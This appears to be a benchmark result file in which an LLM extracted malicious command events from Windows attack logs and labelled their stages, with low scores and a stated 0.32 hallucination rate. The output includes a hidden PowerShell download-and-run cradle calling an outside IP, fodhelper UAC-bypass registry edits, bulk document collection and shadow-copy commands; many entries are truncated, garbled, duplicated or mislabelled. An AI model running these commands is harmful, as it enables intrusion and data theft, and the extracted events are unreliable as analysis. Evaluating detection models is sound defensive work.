@@ -1,0 +1,246 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C net time \\127.0.0.1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003`n`` 1`` -TestNumbers 1 ``",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\05gtqq4u\\05gtqq4u.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\05gtqq4u\\05gtqq4u.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\05gtqq4u\\05gtqq4u.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\05gtqq4u\\05gtqq4u.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C `.\\msxsl.exe C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl`, ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C `invoke-webrequest http://124.223.85.207:8082/test.hta -method post-usebasicparsing-contenttype application/json`n`n`\\| powershell.exe -executionpolicy bypass -c invoke-atomictest t1218.005-n-testnumbers 1 `, ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C `invoke-webrequest http://124.223.85.207:8082/test.hta -method post-usebasicparsing-contenttype application/json`n`n`\\| powershell.exe -executionpolicy bypass -c invoke-atomictest t1218.005-n-testnumbers 1 `, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "searchprotocolhost.exe Global\\UsGthrFltPipeMssGthrPipe26_ Global\\UsGthrCtrlFltPipeMssGthrPipe26 1 -2147483646 software\\microsoft\\windows search mozilla/4.0 (compatible; msie 6.0; windows nt; ms search 4.0 robot) c:\\programdata\\microsoft\\search\\data\\temp\\usgthrservice downleveldaemon ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "searchprotocolhost.exe Global\\UsGthrFltPipeMssGthrPipe26_ Global\\UsGthrCtrlFltPipeMssGthrPipe26 1 -2147483646 software\\microsoft\\windows search mozilla/4.0 (compatible; msie 6.0; windows nt; ms search 4.0 robot) c:\\programdata\\microsoft\\search\\data\\temp\\usgthrservice downleveldaemon ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\fodhelper.exe\\\" }",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\fodhelper.exe\\\" }, ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\fodhelper.exe\\\" }",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\fodhelper.exe\\\" }, ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\fodhelper.exe\\\" }",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c {new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\computerdefaults.exe\\\"}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c {new-item hku:\\software\\classes\\ms-settings\\shell\\open\\command-force new-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name delegateexecute-value \\\"\\\"-force set-itemproperty hku:\\software\\classes\\ms-settings\\shell\\open\\command-name (default)-value \\\"c:\\windows\\system32\\cmd.exe\\\"-force start-process \\\"c:\\windows\\system32\\computerdefaults.exe\\\"}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c reg add \"hkcu\\software\\classes\\mscfile\\shell\\open\\command\" /ve /d \"c:\\windows\\system32\\cmd.exe\" /f & reg add \"hkcu\\software\\classes\\mscfile\\shell\\open\\command\" /v delegateexecute /f & fodhelper.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c reg add \"hkcu\\software\\classes\\mscfile\\shell\\open\\command\" /ve /d \"c:\\windows\\system32\\cmd.exe\" /f & reg add \"hkcu\\software\\classes\\mscfile\\shell\\open\\command\" /v delegateexecute /f & fodhelper.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir \"%temp%\\t1219_command_prompt_collection> NUL 2>&1 & dir c:/b/s /.docx\\| findstr /e .docx & for /r c:/ * .docx Do Copy %f \\%temp%\\t1219_command_prompt_collection\\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir `%temp%\\t1219_powershell_collection>` `out-null`get-childitem -recurse -include *.doc| % {copy-item $_.fullname -destination `$env:temp`t1219_powershell_collection}`, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir `%temp%\\t1219_powershell_collection>` `out-null`get-childitem -recurse -include *.doc| % {copy-item $_.fullname -destination `$env:temp`t1219_powershell_collection}`, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir `%temp%\\t1219_powershell_collection>` `out-null`get-childitem -recurse -include *.doc| % {copy-item $_.fullname -destination `$env:temp`t1219_powershell_collection}`, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir `%temp%\\t1219_powershell_collection>` `out-null`get-childitem -recurse -include *.doc| % {copy-item $_.fullname -destination `$env:temp`t1219_powershell_collection}`, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c mkdir `%temp%\\t1219_powershell_collection>` `out-null`get-childitem -recurse -include *.doc| % {copy-item $_.fullname -destination `$env:temp`t1219_powershell_collection}`, ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))'",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c@c:\tools\tool.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=c:",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe save hkcu\registry key hmreg path temp/reg_saved.key /y",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "ckfinder.exe c:\\path\\to\\file",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attack sequence begins with an initial access vector likely involving either social engineering or exploitation of some kind of vulnerability leading to the execution of a PowerShell script likely downloaded from a remote server or created locally to gain persistence within the target system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 240202,
+      "completion_tokens": 5895,
+      "total_tokens": 246097,
+      "wall_clock_s": 63.321,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.12244897959183673,
+      "recall": 0.21428571428571427,
+      "f1": 0.15584415584415584,
+      "tp": 6,
+      "fp": 43,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.04081632653061224,
+      "recall": 0.08333333333333333,
+      "f1": 0.054794520547945195,
+      "tp": 2,
+      "fp": 47,
+      "fn": 22,
+      "recall_partial": 0.043478260869565216
+    },
+    "hallucination_rate": 0.3157894736842105,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 240202,
+      "completion_tokens": 5895,
+      "total_tokens": 246097,
+      "wall_clock_s": 63.321,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
